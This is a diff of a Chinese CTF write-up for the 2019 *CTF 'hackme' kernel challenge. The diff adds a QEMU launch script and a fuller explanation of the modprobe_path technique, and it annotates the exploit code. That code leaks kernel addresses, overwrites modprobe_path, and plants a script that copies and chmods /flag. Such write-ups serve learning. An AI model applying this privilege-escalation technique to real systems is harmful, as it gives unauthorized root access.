@@ -1,11 +1,26 @@
 ---
 layout: post
 title: 2019 STARCTF hackme
-excerpt: "kernel pwn"
-categories: [Writeup]
+excerpt: "利用modprobe_path方法提权"
+categories: [writeup]
 comments: true
 ---
 参考:https://xz.aliyun.com/t/6067
+
+启动脚本
+```
+#! /bin/sh
+qemu-system-x86_64 \
+    -m 256M \
+    -nographic \
+    -kernel bzImage \
+    -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \
+    -monitor /dev/null \
+    -initrd initramfs.cpio \
+    -smp cores=4,threads=2 \
+    -gdb tcp::1234 \
+    -cpu qemu64,smep,smap
+```
 #### modprobe_path
 modprobe_path指向了一个内核在运行未知文件类型时运行的二进制文件;当内核运行一个错误格式的文件的时候,会调用这个modprobe_path所指向的二进制文件去，如果我们将这个字符串指向我们的自己的二进制文件,那么在发生错误的时候就可以执行我们自己二进制文件了....
 
@@ -71,7 +86,7 @@ ffffffffa4006a80 d mod_tree
 通常我们有了任意地址读写能力后,我们可以通过修改cred结构体或者劫持VDSO来进行高权限的操作,但是这里我们使用一种比较有意思的方法来进行高权限的操作;
 modprobe_path所指的位置通常是发生了错误的时候才调用的
 
-##### 总结:就是通过任意地址读写修改modprobe_path处的二进制文件,从而进行任意文件读写
+##### 总结:就是通过任意地址读写修改modprobe_path处的二进制文件,从而进行任意文件读写(modprobe_path就是一个字符串指针,原理是call_usermodehelper(modprobe_path, argv, envp...,所以将这个字符串指针改为我们想要的就行了,注意是绝对路径)
 最终exp
 ```
 #include<stdio.h>
@@ -119,15 +134,15 @@ void cout_kernel(int id, char *data, size_t len, size_t offset){
 }
 
 int main(){
-    fd = open("/dev/hackme",0);
+    fd = open("/dev/hackme",0);     // 打开设备
     size_t heap_addr,kernel_addr,mod_tree_addr,ko_addr,pool_addr;
-    char *mem = malloc(0x1000);
+    char *mem = malloc(0x1000);     // 申请一块内存空间
     if(fd < 0){
         printf("[*]OPEN KO ERROR!\n");
         exit(0);
     }
     memset(mem,'A',0x100);
-    alloc(0,mem,0x100);
+    alloc(0,mem,0x100);         // 也是一种分配内存的方式
     alloc(1,mem,0x100);
     alloc(2,mem,0x100);
     alloc(3,mem,0x100);
@@ -140,10 +155,10 @@ int main(){
     printf("[*]heap_addr: 0x%16llx\n",heap_addr);
 
     cout_kernel(0,mem,0x200,-0x200);
-    kernel_addr = *((size_t *)mem) - 0x0472c0;
-    mod_tree_addr = kernel_addr + 0x011000;
-    printf("[*]kernel_addr: 0x%16llx\n",kernel_addr);
-    printf("[*]mod_tree_add: 0x%16llx\n",mod_tree_addr);
+    kernel_addr = *((size_t *)mem) - 0x0472c0;                  // 通过调试得到
+    mod_tree_addr = kernel_addr + 0x011000;                     // 通过grep mod_tree /proc/kallsyms 得到
+    printf("[*]kernel_addr: 0x%16llx\n",kernel_addr);           // 内核的基地址
+    printf("[*]mod_tree_add: 0x%16llx\n",mod_tree_addr);        // 内核mod_tree地址
 
     memset(mem,'B',0x100);
     *((size_t  *)mem) = mod_tree_addr + 0x50;
@@ -171,8 +186,10 @@ int main(){
 
     strncpy(mem,"/home/pwn/copy.sh\0",18);
     cin_kernel(0xc,mem,18,0);
+
+
     system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
-    system("chmod +x /home/pwn/copy.sh");
+    system("chmod +x /home/pwn/copy.sh");                       // 运行一系列函数
     system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/sir");
     system("chmod +x /home/pwn/sir");
 
